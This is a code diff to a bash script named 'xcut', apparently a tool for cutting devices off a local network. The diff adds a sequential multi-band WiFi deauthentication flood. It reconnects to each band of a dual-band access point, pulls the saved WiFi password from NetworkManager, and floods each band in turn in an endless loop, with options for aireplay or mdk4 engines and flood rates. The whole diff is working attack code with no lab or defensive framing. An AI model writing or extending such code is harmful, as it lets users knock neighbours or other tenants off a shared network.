@@ -49,6 +49,19 @@ usage:
   xcut deauth stop        stop deauth, restore your interface
                           (or just press Ctrl+C on the running deauth)
 
+  xcut deauth all envs:
+    DEAUTH_SEQ=1 xcut deauth all     attack EVERY band of a dual-band AP one
+                            band at a time (built-in iwlwifi only; reconnects
+                            wlan0 to each band's SSID, floods, moves on)
+    DEAUTH_SEQ_TIME=60     seconds per band in seq mode (default 90)
+    DEAUTH_HOP=1 xcut deauth all     channel-hop sibling APs (USB adapter only
+                            - crashes iwlwifi firmware)
+    DEAUTH_GAP=4 xcut deauth all     raise pause between bursts (gentle mode)
+    DEAUTH_GENTLE=1 xcut deauth all  burst loop instead of continuous flood
+    DEAUTH_MON=sub xcut deauth all   monitor sub-interface (WiFi stays up;
+                            may not transmit on some cards)
+    DEAUTH_ENGINE=mdk4 xcut deauth all   use mdk4 engine (MDK4_RATE=20 to lower)
+
   xcut exclude            list excluded devices (skipped by cut all / deauth all)
   xcut exclude <nr|ip>    add a device to the exclude list
   xcut exclude -<nr|ip>   remove a device from the exclude list
@@ -161,7 +174,7 @@ require_root() {
         # (observed: DEAUTH_ENGINE=mdk4 ran aireplay instead). Pass them
         # through explicitly as VAR=value arguments.
         local args=() v
-        for v in DEAUTH_GAP DEAUTH_ENGINE DEAUTH_BURST MDK4_RATE DEAUTH_HOP DEAUTH_MON DEAUTH_GENTLE; do
+        for v in DEAUTH_GAP DEAUTH_ENGINE DEAUTH_BURST MDK4_RATE DEAUTH_HOP DEAUTH_MON DEAUTH_GENTLE DEAUTH_SEQ DEAUTH_SEQ_TIME; do
             [ -n "${!v:-}" ] && args+=("${v}=${!v}")
         done
         exec sudo "${args[@]}" "$0" "$@"
@@ -987,6 +1000,94 @@ deauth_stop() {
     fi
 }
 
+# ---- sequential multi-band deauth (single-radio iwlwifi workaround) ----
+# One radio can only sit on ONE channel, and channel-hopping crashes the
+# iwlwifi firmware, so a dual-band AP's two bands can never be attacked at
+# once with the built-in card. DEAUTH_SEQ=1 handles the bands one after
+# another: reconnect wlan0 to each band's SSID (same base name, e.g.
+# "Kosan73(5G)" + "Kosan73(4G)" -> base "Kosan73"), run the normal per-band
+# flood for a while, then move to the next band and repeat. Ctrl+C stops and
+# restores your original WiFi. A USB adapter (RTL8812AU/mt76) with
+# DEAUTH_HOP=1 still does both bands simultaneously - prefer that.
+
+seq_prof_of() {             # $1 = SSID -> NM profile name ("" if none)
+    nmcli -t -f NAME,SSID connection show 2>/dev/null | awk -F: -v s="$1" '$2==s{print $1; exit}'
+}
+
+seq_join() {                # $1 = SSID; connect and wait until linked (root)
+    local p="$1" i cur
+    p="$(seq_prof_of "$1")"
+    if [ -n "$p" ]; then
+        nmcli con up "$p" >/dev/null 2>&1
+    elif [ -n "${SEQ_PSK:-}" ]; then
+        nmcli dev wifi connect "$1" ifname "$DEV" password "$SEQ_PSK" >/dev/null 2>&1
+    else
+        echo "  skip '$1': no saved NM profile and no way to join it"
+        return 1
+    fi
+    for i in $(seq 1 30); do
+        cur="$(iw dev "$DEV" link 2>/dev/null | awk '/SSID:/{print $2; exit}')"
+        [ "$cur" = "$1" ] && return 0
+        sleep 1
+    done
+    echo "  skip '$1': could not join within 30s"
+    return 1
+}
+
+seq_stop() {                # restore original WiFi profile (trap handler)
+    [ -n "${child:-}" ] && { kill "$child" 2>/dev/null; wait "$child" 2>/dev/null; }
+    if [ -n "${orig:-}" ]; then
+        echo "restoring original WiFi profile '$orig' ..."
+        nmcli con up "$orig" >/dev/null 2>&1 || true
+    fi
+}
+
+deauth_seq_run() {          # $1 = nr|ip|all ; root
+    trap 'seq_stop; exit 0' INT TERM
+    local cur base scan_all others b child seqt orig
+    cur="$(iw dev "$DEV" link 2>/dev/null | awk '/SSID:/{print $2; exit}')"
+    [ -n "$cur" ] || die "not connected to an AP - nothing to find sibling bands of"
+    base="$(echo "$cur" | sed 's/[[:space:]]*([^()]*)$//')"
+    echo "== sequential multi-band deauth on base SSID '$base' =="
+    scan_all="$(timeout 15 iw dev "$DEV" scan 2>/dev/null)"
+    others="$(echo "$scan_all" | awk '
+        function emit(){ if(s && f) print s, f }
+        /^BSS /{emit(); b=$2; sub(/\(.*/, "", b); f=""; s=""}
+        /freq:/{if(b && !f) f=$2}
+        /SSID:/{if(b && !s) s=$2}
+        END{emit()}
+    ' | awk -v base="$base" -v cur="$cur" '
+        { s=$1; sub(/[[:space:]]*\([^()]*\)$/, "", s)
+          if (s==base && $1!=cur) print $1 }' | sort -u)"
+    if [ -z "$others" ]; then
+        echo "  no sibling APs share base SSID '$base' - single band, attacking directly"
+        deauth_start "$1" "$DEV"
+        return
+    fi
+    echo "  bands: $cur + $(echo "$others" | tr '\n' ' ')"
+    seqt="${DEAUTH_SEQ_TIME:-90}"
+    echo "  cycling ${seqt}s per band; Ctrl+C stops and restores your original WiFi"
+    orig="$(seq_prof_of "$cur")"
+    if [ -n "$orig" ]; then
+        # reuse the current profile's PSK so a never-joined sibling can connect
+        SEQ_PSK="$(nmcli -s -t -f 802-11-wireless-security.psk connection show "$orig" 2>/dev/null | awk -F: '{print $2}')"
+        [ -n "$SEQ_PSK" ] || echo "  note: could not read PSK - unjoined bands will be skipped"
+    fi
+    while :; do
+        for b in $cur $others; do
+            [ -n "$b" ] || continue
+            seq_join "$b" || continue
+            echo "== attacking band '$b' (${seqt}s; own WiFi off while flooding) =="
+            deauth_start "$1" "$DEV" &
+            child=$!
+            sleep "$seqt"
+            kill "$child" 2>/dev/null
+            wait "$child" 2>/dev/null
+            child=""
+        done
+    done
+}
+
 main() {
     case "${1:-}" in
         scan)                require_root "$@"; scan ;;
@@ -1005,7 +1106,9 @@ uncut) [ -n "${2:-}" ] || usage
               else
                   [ -n "${2:-}" ] || usage
                   get_netinfo
-                  if [ "$2" = "all" ] || [[ "$2" =~ ^[0-9]+$ ]] || [[ "$2" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+                  if [ "${DEAUTH_SEQ:-0}" = "1" ]; then
+                      deauth_seq_run "$2"
+                  elif [ "$2" = "all" ] || [[ "$2" =~ ^[0-9]+$ ]] || [[ "$2" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                       deauth_start "$2" "${3:-}"
                   else
                       deauth_start "${3:-all}" "$2"   # "$2" is an iface name
